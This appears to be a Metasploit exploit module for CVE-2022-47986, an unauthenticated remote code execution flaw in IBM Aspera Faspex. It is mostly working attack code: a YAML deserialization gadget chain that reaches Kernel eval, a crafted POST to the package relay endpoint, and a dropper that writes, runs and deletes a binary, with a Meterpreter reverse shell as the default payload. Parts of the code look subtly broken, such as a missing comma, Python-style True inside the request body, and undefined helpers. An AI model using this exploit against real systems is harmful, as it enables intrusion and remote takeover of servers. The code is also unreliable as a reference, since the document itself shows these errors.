##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::CheckModule
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'IBM Aspera Faspex YAML deserialization vulnerability',
        'Description' => %q{
          This module exploit an unauthenticated RCE vulnerability
          which exists in IBM Aspera Faspex version 4.4.1 (CVE-2022-47986).
        },
        'References' => [
          ['CVE', '2022-47986'],
          ['URL', 'https://www.ibm.com/support/pages/node/6952319'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-47986'],
          ['URL', 'https://github.com/ohnonoyesyes/CVE-2022-47986/blob/main/poc.py'],
          ['URL', 'https://thehackernews.com/2023/03/icefire-linux-ransomware.html'],
          ['URL', 'https://attackerkb.com/topics/jadqVo21Ub/cve-2022-47986/rapid7-analysis?source=mastodon'],
        ],
        'Author' => [
          'ohnonoyesyes'     # POC
          'Maurice LAMBERT', # Metasploit auxiliary module
        ],
        'DisclosureDate' => '',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
        'DefaultOptions' => {
          'CheckModule' => '',
          'Action' => 'CHECK_RCE',
          'RPORT' => 443,
          'SSL' => true
        },
        'Targets' => [
          [
            'Automatic (Dropper)',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :linux_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
                'DisablePayloadHandler' => 'false'
              }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def cmd_unix_generic?
    datastore['PAYLOAD'] == 'cmd/unix/generic'
  end

  def execute_command(command, _opts = {})
    exploit = %q#
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "pew"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:PrettyPrint
             output: !ruby/object:Net::WriteAdapter
                 socket: &1 !ruby/module "Kernel"
                 method_id: :eval
             newline: "throw `command`"
             buffer: {}
             group_stack:
              - !ruby/object:PrettyPrint::Group
                break: true
         method_id: :breakable
      #.gsub(/command/, command).gsub(/\n/, "\\n").gsub(/"/, "\\\"")

      payload = %q#{
  "package_file_list": [
    "/"
  ],
  "external_emails": "exploit",
  "package_name": "assetnote_pack",
  "package_note": "hello from assetnote team",
  "original_sender_name": "assetnote",
  "package_uuid": "d7cb6601-6db9-43aa-8e6b-dfb4768647ec",
  "metadata_human_readable": "Yes",
  "forward": "pew",
  "metadata_json": '{}',
  "delivery_uuid": "d7cb6601-6db9-43aa-8e6b-dfb4768647ec",
  "delivery_sender_name": "assetnote",
  "delivery_title": "TEST",
  "delivery_note": "TEST",
  "delete_after_download": True,
  "delete_after_download_condition": "IDK",
}#.gsub(/exploit/, exploit)

    response = send_request_raw({
      'method' => "POST",
      'uri' => normalize_uri(datastore['TARGETURI'], '/aspera/faspex/package_relay/relay_package'),
      'data' => payload,
    })
    if response && response.body
      return response.body
    end

    false
  end

  def exploit
    file_name = "/tmp/#{Rex::Text.rand_text_alpha(4..8)}"
    cmd = "echo #{Rex::Text.encode_base64(generate_payload_exe)} | base64 -d > #{file_name}; chmod +x #{file_name}; #{file_name}; rm -f #{file_name}"

    print_status(message("Sending #{datastore['PAYLOAD']} command payload"))
    vprint_status(message("Generated command payload: #{cmd}"))

    execute_command(cmd)

    register_file_for_cleanup file_name
  end
end
